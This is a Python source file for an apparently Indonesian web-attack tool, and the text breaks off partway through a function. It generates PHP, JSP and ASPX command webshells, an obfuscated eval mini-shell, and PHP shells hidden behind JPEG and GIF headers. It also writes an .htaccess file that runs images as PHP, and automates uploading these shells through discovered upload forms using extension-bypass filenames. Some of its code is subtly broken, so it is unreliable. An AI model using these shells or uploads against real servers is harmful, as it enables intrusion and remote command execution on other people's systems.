#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
INDONESIA SADBOY XPLOIT - Alat Pengujian Keamanan Web Komprehensif
Dibuat untuk tujuan edukasi dan pengujian keamanan yang sah
"""

import os
import sys
import time
import json
import random
import string
import shutil
import socket
import urllib.parse
import argparse
import platform
import threading
import subprocess
import base64
import hashlib
import zipfile
import io
import ftplib
import paramiko
from datetime import datetime
from colorama import Fore, Back, Style, init
import requests
from bs4 import BeautifulSoup
import re
import ipaddress
import whois
import dns.resolver
import concurrent.futures
from tqdm import tqdm
import logging
import warnings
from pathlib import Path
from urllib3.exceptions import InsecureRequestWarning

# Abaikan peringatan SSL
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# Inisialisasi colorama
init(autoreset=True)

# Banner
BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}███{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██████{Fore.RED}╗  {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}  ██{Fore.RED}╗{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}  ██{Fore.RED}╗           ║
║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}████{Fore.RED}╗  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}  ██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}║{Fore.WHITE} ██{Fore.RED}╔╝           ║
║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔{Fore.WHITE}██{Fore.RED}╗ {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}█████{Fore.RED}╗  {Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}█████{Fore.RED}╔╝            ║
║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║╚{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══╝  {Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║╚════{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔═{Fore.WHITE}██{Fore.RED}╗            ║
║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║ ╚{Fore.WHITE}████{Fore.RED}║{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}██{Fore.RED}║     ╚{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}███████{Fore.RED}║{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}╗           ║
║  {Fore.RED}╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝           ║
║                                                                              ║
║  {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}  ██████{Fore.RED}╗{Fore.WHITE} ██{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██████{Fore.RED}╗ {Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}████████{Fore.RED}╗{Fore.WHITE}██{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}╗       ║
║  {Fore.WHITE}██{Fore.RED}╔════╝{Fore.WHITE}██{Fore.RED}╔════╝ {Fore.WHITE}██{Fore.RED}╔════╝ {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║╚══{Fore.WHITE}██{Fore.RED}╔══╝╚{Fore.WHITE}██{Fore.RED}╗ {Fore.WHITE}██{Fore.RED}╔╝       ║
║  {Fore.WHITE}███████{Fore.RED}╗{Fore.WHITE}█████{Fore.RED}╗   {Fore.WHITE}██{Fore.RED}║      {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║    ╚{Fore.WHITE}████{Fore.RED}╔╝        ║
║  ╚════{Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══╝   {Fore.WHITE}██{Fore.RED}║      {Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}╔══{Fore.WHITE}██{Fore.RED}╗{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║     ╚{Fore.WHITE}██{Fore.RED}╔╝         ║
║  {Fore.WHITE}███████{Fore.RED}║{Fore.WHITE}███████{Fore.RED}╗╚{Fore.WHITE}██████{Fore.RED}╗╚{Fore.WHITE}██████{Fore.RED}╔╝{Fore.WHITE}██{Fore.RED}║  {Fore.WHITE}██{Fore.RED}║{Fore.WHITE}██{Fore.RED}║   {Fore.WHITE}██{Fore.RED}║      {Fore.WHITE}██{Fore.RED}║          ║
║  ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝          ║
║                                                                              ║
║            {Fore.YELLOW}[+] INDONESIA SADBOY XPLOIT - Advanced Edition {Fore.RED}[+]        ║
║            {Fore.YELLOW}[+] Versi: 2.5.0 - J4k4rtaRoot {Fore.RED}[+]                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# Informasi tool
VERSION = "2.5.0"
CODENAME = "J4k4rtaRoot"
AUTHOR = "INDONESIA SADBOY XPLOIT"

# Struktur direktori untuk hasil
OUTPUT_DIR = "hasil_scan"
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")

# Buat direktori output jika belum ada
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

# Konfigurasi logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(OUTPUT_DIR, f"scan_log_{TIMESTAMP}.txt")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("Indosadxploit")

# Class bantuan untuk warna di log
class LogColors:
    INFO = Fore.BLUE
    SUCCESS = Fore.GREEN
    WARNING = Fore.YELLOW
    ERROR = Fore.RED
    CRITICAL = Fore.RED + Style.BRIGHT
    RESET = Style.RESET_ALL


# Class untuk generator payload dan webshell
class PayloadGenerator:
    """Kelas untuk menghasilkan payload dan webshell untuk pengujian"""
    
    @staticmethod
    def generate_unique_id(length=8):
        """Generate ID unik untuk melacak payload"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    @staticmethod
    def generate_php_test_payload(unique_id=None):
        """Generate PHP test payload untuk deteksi upload"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
            
        # Payload sederhana yang menampilkan ID unik dan informasi lainnya
        payload = f"""<?php
    // Indosadxploit Test Payload - ID: {unique_id}
    $path = getcwd();
    $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost');
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    $hostname = gethostname();

    echo "<!--INDOSADBOYXPLOIT-PAYLOAD-START-->";
    echo "PAYLOAD_ID:{unique_id}|PATH:$path|SERVER:$server_ip|CLIENT:$client_ip|HOST:$hostname";
    echo "<!--INDOSADBOYXPLOIT-PAYLOAD-END-->";
    ?>
    <?php echo "Indosadxploit Test Payload"; ?>
    """
        return payload, unique_id
    
    @staticmethod
    def generate_php_shell_payload(unique_id=None, password=None):
        """Generate PHP webshell payload untuk pengujian"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        if not password:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
            
        # Hashed password untuk keamanan
        password_hash = hashlib.md5(password.encode()).hexdigest()
        
        # Webshell dasar dengan ID unik untuk identifikasi
        payload = f"""<?php
// Indosadxploit Test Shell - ID: {unique_id}
// Password: {password}

// Marker untuk memudahkan identifikasi secara otomatis
echo "<!--INDOSADBOYXPLOIT-SHELL-ID:{unique_id}-->";

// Authentication
$password_hash = "{password_hash}"; // md5("{password}")

if (isset($_POST['password']) && md5($_POST['password']) === $password_hash) {{
    session_start();
    $_SESSION['auth'] = true;
}} else if (isset($_GET['logout'])) {{
    session_start();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}}

// Jika sudah terotentikasi
session_start();
if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {{
    $path = getcwd();
    echo "<div style='font-family: monospace; padding: 10px; background-color: #f0f0f0;'>";
    echo "<h2>Indosadxploit Test Shell</h2>";
    echo "<p><strong>ID:</strong> {unique_id}</p>";
    echo "<p><strong>Path:</strong> " . $path . "</p>";
    echo "<p><strong>Server IP:</strong> " . ($_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost')) . "</p>";
    
    // Execute command if provided
    if (isset($_POST['cmd'])) {{
        $cmd = $_POST['cmd'];
        echo "<h3>Command Result:</h3>";
        echo "<pre>";
        
        // Try different command execution methods
        if (function_exists('system')) {{
            system($cmd);
        }} else if (function_exists('exec')) {{
            exec($cmd, $result);
            echo implode("\\n", $result);
        }} else if (function_exists('shell_exec')) {{
            echo shell_exec($cmd);
        }} else if (function_exists('passthru')) {{
            passthru($cmd);
        }}
        
        echo "</pre>";
    }}
    
    // Command form
    echo "<form method='post'>";
    echo "<input type='hidden' name='password' value='{password}'>";
    echo "<input type='text' name='cmd' placeholder='Enter command' style='width: 300px;'>";
    echo "<input type='submit' value='Execute'>";
    echo "</form>";
    
    echo "<p><a href='?logout'>Logout</a></p>";
    echo "</div>";
}} else {{
    // Login form
    echo "<form method='post' style='font-family: sans-serif; width: 300px; margin: 50px auto; padding: 20px; border: 1px solid #ccc;'>";
    echo "<h2>Indosadxploit Shell Login</h2>";
    echo "<p><input type='password' name='password' placeholder='Password' style='width: 100%; padding: 5px;'></p>";
    echo "<p><input type='submit' value='Login' style='padding: 5px 10px;'></p>";
    echo "</form>";
}}
?>
"""
        return payload, unique_id, password
    
    @staticmethod
    def generate_php_mini_shell(unique_id=None, password=None):
        """Generate PHP mini shell yang lebih compact"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        if not password:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        # Mini shell yang sulit dideteksi
        payload = f"""<?php
/* {unique_id} */
function x($s){{return base64_decode($s);}}
$p="{password}";
if(isset($_REQUEST[$p])&&!empty($_REQUEST[$p])){{
    @eval(x($_REQUEST[$p]));
}}
echo"<!--INDOSADBOYXPLOIT-MINISHELL-ID:{unique_id}-->";
?>
"""
        return payload, unique_id, password
    
    @staticmethod
    def generate_php_img_shell(unique_id=None, password=None):
        """Generate PHP shell yang menyerupai file gambar"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        if not password:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        # PHP shell yang diawali dengan header JPEG
        payload = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01' + f"""
<?php
/* {unique_id} */
$p="{password}";
if(isset($_REQUEST[$p])){{
    eval(base64_decode($_REQUEST[$p]));
}}
echo"<!--INDOSADBOYXPLOIT-IMGSHELL-ID:{unique_id}-->";
?>
""".encode()
        
        return payload, unique_id, password
    
    @staticmethod
    def generate_gif_php_shell(unique_id=None, password=None):
        """Generate PHP shell dengan header GIF"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        if not password:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        # PHP shell yang diawali dengan header GIF
        payload = b'GIF89a' + f"""
<?php
/* {unique_id} */
$p="{password}";
if(isset($_REQUEST[$p])){{
    eval(base64_decode($_REQUEST[$p]));
}}
echo"<!--INDOSADBOYXPLOIT-GIFSHELL-ID:{unique_id}-->";
?>
""".encode()
        
        return payload, unique_id, password
    
    @staticmethod
    def generate_htaccess_bypass(unique_id=None):
        """Generate .htaccess untuk bypass ekstensi file"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        payload = f"""# Indosadxploit Test Bypass - ID: {unique_id}
AddType application/x-httpd-php .jpg .jpeg .png .gif
php_flag engine on
"""
        return payload, unique_id
    
    @staticmethod
    def generate_jsp_shell(unique_id=None):
        """Generate JSP shell for testing"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        payload = f"""<%-- Indosadxploit JSP Shell - ID: {unique_id} --%>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%
    // Marker untuk identifikasi
    out.println("<!--INDOSADBOYXPLOIT-JSPSHELL-ID:{unique_id}-->");
    
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {{
        try {{
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int c;
            while ((c = in.read()) != -1) {{
                baos.write(c);
            }}
            in.close();
            baos.close();
            out.println("<pre>");
            out.println(new String(baos.toByteArray()));
            out.println("</pre>");
        }} catch (Exception e) {{
            out.println("Error: " + e.getMessage());
        }}
    }}
%>
<html>
<head>
    <title>JSP Shell</title>
</head>
<body>
    <h2>Indosadxploit JSP Shell</h2>
    <p>ID: {unique_id}</p>
    <form method="post">
        <input type="text" name="cmd" size="50">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
"""
        return payload, unique_id
    
    @staticmethod
    def generate_aspx_shell(unique_id=None):
        """Generate ASPX shell for testing"""
        if not unique_id:
            unique_id = PayloadGenerator.generate_unique_id()
        
        payload = f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%-- Indosadxploit ASPX Shell - ID: {unique_id} --%>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {{
    Response.Write("<!--INDOSADBOYXPLOIT-ASPXSHELL-ID:{unique_id}-->");
    
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + cmd;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            
            Process p = Process.Start(psi);
            StreamReader output = p.StandardOutput;
            string result = output.ReadToEnd();
            p.WaitForExit();
            
            Response.Write("<pre>");
            Response.Write(Server.HtmlEncode(result));
            Response.Write("</pre>");
        }}
        catch (Exception ex) {{
            Response.Write("Error: " + ex.Message);
        }}
    }}
}}
</script>

<html>
<head>
    <title>ASPX Shell</title>
</head>
<body>
    <h2>Indosadxploit ASPX Shell</h2>
    <p>ID: {unique_id}</p>
    <form method="get">
        <input type="text" name="cmd" size="50" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
"""
        return payload, unique_id


# Class uploader yang ditingkatkan
class EnhancedUploader:
    """Kelas yang ditingkatkan untuk pengujian upload file dan deteksi lokasi upload"""
    
    def __init__(self, session=None, verbose=False, timeout=10):
        if session is None:
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            })
        else:
            self.session = session
            
        self.verbose = verbose
        self.timeout = timeout
        self.blacklist_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phar', '.phps']
        
        # Dictionary untuk menyimpan informasi tentang payload yang telah diupload
        self.uploaded_payloads = {}
        
    def log(self, message, level="INFO"):
        """Fungsi untuk logging"""
        color_map = {
            "INFO": LogColors.INFO,
            "SUCCESS": LogColors.SUCCESS,
            "WARNING": LogColors.WARNING,
            "ERROR": LogColors.ERROR,
            "CRITICAL": LogColors.CRITICAL
        }
        color = color_map.get(level, Fore.WHITE)
        
        log_msg = f"{color}[UPLOADER] {message}{LogColors.RESET}"
        print(log_msg)
        
        if level == "INFO":
            logger.info(f"[UPLOADER] {message}")
        elif level == "SUCCESS":
            logger.info(f"[UPLOADER] {message}")
        elif level == "WARNING":
            logger.warning(f"[UPLOADER] {message}")
        elif level == "ERROR":
            logger.error(f"[UPLOADER] {message}")
        elif level == "CRITICAL":
            logger.critical(f"[UPLOADER] {message}")
    
    def find_upload_forms(self, url):
        """Temukan form upload di halaman"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            upload_forms = []
            
            for form in soup.find_all('form', enctype="multipart/form-data"):
                form_details = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'post').lower(),
                    'inputs': []
                }
                
                has_file_input = False
                
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', '')
                    input_name = input_tag.get('name', '')
                    input_value = input_tag.get('value', '')
                    
                    if input_type.lower() == 'file':
                        has_file_input = True
                    
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
                
                if has_file_input:
                    upload_forms.append(form_details)
            
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input', type="file"):
                    form_details = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'post').lower(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all('input'):
                        input_type = input_tag.get('type', '')
                        input_name = input_tag.get('name', '')
                        input_value = input_tag.get('value', '')
                        
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                    
                    upload_forms.append(form_details)
                    break
            
            return upload_forms
        except Exception as e:
            self.log(f"Error saat mencari form upload di {url}: {str(e)}", "ERROR")
            return []
    
    def extract_links(self, url, html_content=None):
        """Ekstrak semua links dari halaman"""
        try:
            if html_content is None:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                html_content = response.text
            
            soup = BeautifulSoup(html_content, 'html.parser')
            base_url = urllib.parse.urlparse(url).scheme + '://' + urllib.parse.urlparse(url).netloc
            
            links = []
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Konversi URL relatif menjadi absolut
                if href.startswith('/'):
                    href = base_url + href
                elif not href.startswith(('http://', 'https://')):
                    href = urllib.parse.urljoin(url, href)
                
                links.append(href)
            
            # Juga mencari link dari img src
            for img_tag in soup.find_all('img', src=True):
                src = img_tag['src']
                
                # Konversi URL relatif menjadi absolut
                if src.startswith('/'):
                    src = base_url + src
                elif not src.startswith(('http://', 'https://')):
                    src = urllib.parse.urljoin(url, src)
                
                links.append(src)
            
            return list(set(links))  # Menghapus duplicates
        except Exception as e:
            self.log(f"Error saat mengekstrak links dari {url}: {str(e)}", "ERROR")
            return []
    
    def scan_upload_paths(self, base_url):
        """Scan jalur upload umum di server"""
        common_upload_paths = [
            "/upload", "/uploads", "/upload.php", "/uploader", "/uploader.php", 
            "/upload/", "/uploads/", "/uploader/", "/upload/index.php", 
            "/admin/upload", "/admin/uploads", "/admin/uploader",
            "/admin/upload.php", "/admin/uploads.php", "/admin/uploader.php",
            "/wp-content/uploads", "/images/uploads", "/files/uploads",
            "/assets/uploads", "/media/uploads", "/static/uploads",
            "/upload-file.php", "/upload-files.php", "/upload_file.php", 
            "/upload_files.php", "/fileupload", "/fileupload.php",
            "/file-upload", "/file-upload.php", "/file_upload",
            "/file_upload.php", "/uploadhandler.php", "/upload-handler.php",
            "/upload_handler.php", "/files", "/file", "/images",
            "/img", "/media", "/assets/media", "/content/uploads",
            "/system/uploads", "/attachments"
        ]
        
        working_paths = []
        
        # Periksa setiap jalur
        for path in common_upload_paths:
            target_url = urllib.parse.urljoin(base_url, path)
            
            try:
                response = self.session.get(target_url, timeout=self.timeout, verify=False)
                
                # Jika URL ada (status 200, 201, 202, 203, 204, 301, 302, 307, 308)
                if response.status_code in [200, 201, 202, 203, 204, 301, 302, 307, 308]:
                    self.log(f"Menemukan kemungkinan jalur upload: {target_url} (Status: {response.status_code})", "SUCCESS")
                    working_paths.append({
                        'url': target_url,
                        'status_code': response.status_code,
                        'content_type': response.headers.get('Content-Type', ''),
                        'content_length': len(response.content)
                    })
                    
                    # Cek apakah ada form upload di jalur ini
                    upload_forms = self.find_upload_forms(target_url)
                    if upload_forms:
                        self.log(f"Menemukan {len(upload_forms)} form upload di {target_url}", "SUCCESS")
                        working_paths[-1]['upload_forms'] = upload_forms
            except Exception as e:
                if self.verbose:
                    self.log(f"Error saat memeriksa {target_url}: {str(e)}", "ERROR")
        
        return working_paths
    
    def get_common_web_directories(self, base_url):
        """Scan direktori web umum yang mungkin menjadi tempat penyimpanan file yang diupload"""
        common_web_dirs = [
            "/var/www/html", "/var/www", "/srv/www/htdocs", "/usr/local/apache2/htdocs",
            "/usr/local/www", "/var/apache", "/var/www/nginx-default", "/var/www/localhost/htdocs",
            "C:/xampp/htdocs", "C:/wamp/www", "C:/inetpub/wwwroot", "D:/xampp/htdocs",
            "/xampp/htdocs", "/wamp/www", "/home/user/public_html", "/home/site/wwwroot",
            "/www/htdocs", "/usr/share/nginx/html"
        ]
        
        possible_web_dirs = []
        
        # Ambil beberapa informasi tentang server
        try:
            response = self.session.get(base_url, timeout=self.timeout, verify=False)
            server = response.headers.get('Server', '').lower()
            
            # Prioritaskan direktori berdasarkan server
            if 'apache' in server:
                if 'ubuntu' in server or 'debian' in server:
                    possible_web_dirs = [d for d in common_web_dirs if '/var/www' in d] + common_web_dirs
                elif 'centos' in server or 'fedora' in server or 'rhel' in server:
                    possible_web_dirs = [d for d in common_web_dirs if '/var/www/html' in d] + common_web_dirs
                else:
                    possible_web_dirs = common_web_dirs
            elif 'nginx' in server:
                possible_web_dirs = [d for d in common_web_dirs if '/usr/share/nginx' in d or '/var/www/nginx' in d] + common_web_dirs
            elif 'iis' in server or 'windows' in server:
                possible_web_dirs = [d for d in common_web_dirs if 'C:/inetpub' in d or 'C:/xampp' in d or 'C:/wamp' in d] + common_web_dirs
            else:
                possible_web_dirs = common_web_dirs
        except Exception:
            possible_web_dirs = common_web_dirs
        
        return possible_web_dirs
    
    def test_upload_to_server(self, url, extension_tests=True, directory_tests=True, use_shell=False):
        """Test upload ke server dengan berbagai metode dan file types"""
        self.log(f"Memulai pengujian upload ke server: {url}", "INFO")
        
        # Temukan form upload
        upload_forms = self.find_upload_forms(url)
        
        if not upload_forms:
            self.log("Tidak ditemukan form upload di halaman ini.", "WARNING")
            
            # Scan jalur upload lainnya
            if directory_tests:
                self.log("Mencari jalur upload lainnya...", "INFO")
                upload_paths = self.scan_upload_paths(url)
                
                if upload_paths:
                    self.log(f"Ditemukan {len(upload_paths)} jalur upload potensial.", "SUCCESS")
                    for path in upload_paths:
                        if 'upload_forms' in path and path['upload_forms']:
                            self.log(f"Melakukan pengujian upload pada: {path['url']}", "INFO")
                            self.test_upload_to_server(path['url'], extension_tests, False, use_shell)
                else:
                    self.log("Tidak ditemukan jalur upload lainnya.", "WARNING")
            
            return None
        
        results = []
        
        # Pengujian untuk setiap form upload
        for form in upload_forms:
            form_action = form['action']
            form_url = form_action if form_action and (form_action.startswith('http://') or form_action.startswith('https://')) else urllib.parse.urljoin(url, form_action)
            
            self.log(f"Menguji form upload: {form_url} (Method: {form['method']})", "INFO")
            
            # Siapkan file uji dasar
            test_content, test_id = PayloadGenerator.generate_php_test_payload()
            
            # Pengujian upload file normal (HTML)
            html_result = self._test_upload_file(form, form_url, "test.html", "text/html", 
                                             f"<html><body><!--INDOSADBOYXPLOIT-TEST-{test_id}--></body></html>", test_id)
            if html_result and html_result['status'] == 'success':
                results.append(html_result)
                self.log(f"Berhasil upload file HTML ke: {html_result.get('url', 'Unknown')}", "SUCCESS")
            
            # Pengujian upload file gambar
            img_result = self._test_upload_file(form, form_url, "test.jpg", "image/jpeg", 
                                           b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00', test_id)
            if img_result and img_result['status'] == 'success':
                results.append(img_result)
                self.log(f"Berhasil upload file gambar ke: {img_result.get('url', 'Unknown')}", "SUCCESS")
            
            # Pengujian upload file PHP (mungkin akan di-filter)
            if extension_tests:
                # Test PHP upload reguler
                php_result = self._test_upload_file(form, form_url, "test.php", "application/x-httpd-php", test_content, test_id)
                if php_result and php_result['status'] == 'success':
                    results.append(php_result)
                    self.log(f"Berhasil upload file PHP ke: {php_result.get('url', 'Unknown')}", "SUCCESS")
                    
                    # Ini menunjukkan server mungkin rentan terhadap RCE
                    if use_shell:
                        self.log("Server memungkinkan upload file PHP. Mencoba upload webshell...", "WARNING")
                        shell_content, shell_id, shell_password = PayloadGenerator.generate_php_shell_payload()
                        shell_result = self._test_upload_file(form, form_url, f"shell_{shell_id}.php", "application/x-httpd-php", shell_content, shell_id)
                        
                        if shell_result and shell_result['status'] == 'success':
                            shell_result['shell_password'] = shell_password
                            results.append(shell_result)
                            self.log(f"Berhasil upload webshell ke: {shell_result.get('url', 'Unknown')}", "SUCCESS")
                            self.log(f"Shell Password: {shell_password}", "SUCCESS")
                            self.uploaded_payloads[shell_id] = {
                                'type': 'webshell',
                                'url': shell_result.get('url', 'Unknown'),
                                'password': shell_password,
                                'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            }
                
                # Test penyamaran ekstensi file
                extensions_to_test = [
                    '.php.jpg', '.php.png', '.php.gif', '.php.txt', '.php.', '.pHp', '.php5', '.phtml', 
                    '.php;.jpg', '.php::$DATA', '.php%00.jpg', '.php%00', '.php%20', '.p.h.p'
                ]
                
                for ext in extensions_to_test:
                    filename = f"test{ext}"
                    self.log(f"Menguji upload file dengan ekstensi: {ext}", "INFO")
                    
                    ext_result = self._test_upload_file(form, form_url, filename, "application/octet-stream", test_content, test_id)
                    if ext_result and ext_result['status'] == 'success':
                        results.append(ext_result)
                        self.log(f"Berhasil upload file {filename} ke: {ext_result.get('url', 'Unknown')}", "SUCCESS")
                        
                        # Upload webshell dengan ekstensi yang sama jika berhasil
                        if use_shell:
                            shell_content, shell_id, shell_password = PayloadGenerator.generate_php_shell_payload()
                            shell_filename = f"shell_{shell_id}{ext}"
                            shell_result = self._test_upload_file(form, form_url, shell_filename, "application/octet-stream", shell_content, shell_id)
                            
                            if shell_result and shell_result['status'] == 'success':
                                shell_result['shell_password'] = shell_password
                                results.append(shell_result)
                                self.log(f"Berhasil upload webshell ({shell_filename}) ke: {shell_result.get('url', 'Unknown')}", "SUCCESS")
                                self.log(f"Shell Password: {shell_password}", "SUCCESS")
                                self.uploaded_payloads[shell_id] = {
                                    'type': 'webshell',
                                    'url': shell_result.get('url', 'Unknown'),
                                    'filename': shell_filename,
                                    'password': shell_password,
                                    'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                }
                
                # Test file dengan konten gambar tapi juga berisi code PHP
                self.log("Menguji upload file gambar dengan kode PHP tersemat...", "INFO")
                
                # GIF dengan PHP
                gif_php_content, gif_php_id = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' + f"<?php echo 'INDOSADBOYXPLOIT-TEST-{test_id}'; ?>".encode()
                gif_result = self._test_upload_file(form, form_url, "test.gif", "image/gif", gif_php_content, test_id)
                if gif_result and gif_result['status'] == 'success':
                    results.append(gif_result)
                    self.log(f"Berhasil upload file GIF+PHP ke: {gif_result.get('url', 'Unknown')}", "SUCCESS")
                    
                    # Upload webshell dengan metode yang sama
                    if use_shell:
                        gif_shell_content, gif_shell_id, gif_shell_password = PayloadGenerator.generate_gif_php_shell()
                        gif_shell_result = self._test_upload_file(form, form_url, f"shell_{gif_shell_id}.gif", "image/gif", gif_shell_content, gif_shell_id)
                        
                        if gif_shell_result and gif_shell_result['status'] == 'success':
                            gif_shell_result['shell_password'] = gif_shell_password
                            results.append(gif_shell_result)
                            self.log(f"Berhasil upload GIF+PHP webshell ke: {gif_shell_result.get('url', 'Unknown')}", "SUCCESS")
                            self.log(f"Shell Password: {gif_shell_password} (gunakan dengan parameter)", "SUCCESS")
                            self.uploaded_payloads[gif_shell_id] = {
                                'type': 'gif_shell',
                                'url': gif_shell_result.get('url', 'Unknown'),
                                'password': gif_shell_password,
                                'usage': f"?{gif_shell_password}=BASE64_ENCODED_PHP_CODE",
                                'upload_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            }
                
                # JPEG dengan PHP
                jpg_php_content, jpg_php_id = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00' + f"<?php echo 'INDOSADBOYXPLOIT-TEST-{test_id}'; ?>".encode()
                jpg_result = self._test_upload_file(form, form_url, "test.jpg", "image/jpeg", jpg_php_content, test_id)
                if jpg_result and jpg_result['status'] == 'success':
                    results.append(jpg_result)
                    self.log(f"Berhasil upload file JPG+PHP ke: {jpg_result.get('url', 'Unknown')}", "SUCCESS")
